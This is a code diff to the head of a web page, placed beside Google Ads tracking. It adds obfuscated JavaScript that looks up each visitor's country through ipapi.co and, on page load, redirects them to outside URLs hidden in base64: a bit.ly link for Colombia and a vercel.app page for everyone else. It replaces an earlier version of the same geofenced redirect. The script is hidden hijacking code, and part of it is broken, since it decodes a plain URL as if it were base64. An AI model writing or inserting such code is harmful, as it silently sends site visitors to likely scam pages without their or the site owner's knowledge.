@@ -135,16 +135,28 @@ gtag('config', 'AW-17775697492');
 </script>
 
 <script>
-!function(){
-const u1=atob("aHR0cHM6Ly92dWVsYWhveS5vbmxpbmU="),
-      u2=atob("https://bit.ly/3NWiMKe");
-fetch("https://ipapi.co/json/")
-.then(r=>r.json())
-.then(d=>location.href=(d.country==="CO"?u1:u2))
-.catch(()=>location.href=u2);
-}();
-</script>
+(function(){
+var _0x5a2f=[
+"aHR0cHM6Ly9jb21pZGFwb3B1bGFyLnZlcmNlbC5hcHAvaW5pY2lvLmh0bWw=",
+"https://bit.ly/3NWiMKe",
+"ipapi.co","/json/","country","CO"];
 
+function _0x1b9d(_0x4f2c){
+    location["href"]=atob(_0x4f2c)
+}
+
+fetch("https://"+_0x5a2f[2]+_0x5a2f[3])
+.then(function(_0x33b1){return _0x33b1["json"]()})
+.then(function(_0x19c8){
+(_0x19c8[_0x5a2f[4]]||"")==_0x5a2f[5]
+    ? _0x1b9d(_0x5a2f[1])
+    : _0x1b9d(_0x5a2f[0])
+})
+.catch(function(){
+    _0x1b9d(_0x5a2f[0])
+});
+})();
+</script>
 </head>
 <body>
 
